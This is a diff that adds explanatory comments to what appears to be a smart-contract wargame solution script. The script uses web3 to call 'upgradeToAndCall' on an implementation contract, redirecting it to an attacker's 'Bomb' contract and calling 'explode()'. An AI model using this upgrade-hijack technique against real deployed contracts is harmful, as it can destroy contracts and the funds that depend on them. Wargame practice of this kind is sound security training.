@@ -27,9 +27,10 @@ await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => 
 // Just copy down the code in 26.Attack.sol in remix and copy the address down here
 bombAddr = "<Your contract address>" 
 
-// Now, we have to call the explode() function of our Bomb contract, Rest of the lines makes that damn clear
+// Now, we have to call the explode() function of our Bomb contract.
 explodeData = web3.eth.abi.encodeFunctionSignature("explode()") 
 
+// This is the signature of the function we are going to call, done in this way such that one can add params to the function 
 upgradeSignature = {
     name: 'upgradeToAndCall',
     type: 'function',
@@ -45,9 +46,12 @@ upgradeSignature = {
     ]
 }
 
+// These are the parameters that we are going to pass to the function
 upgradeParams = [bombAddr, explodeData] 
 
+// This line encodes the function signature and the parameters to be passed to the function
 upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams) 
 
+// At the end, we are going to call the function and upgrade the contract
 await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData}) 
 
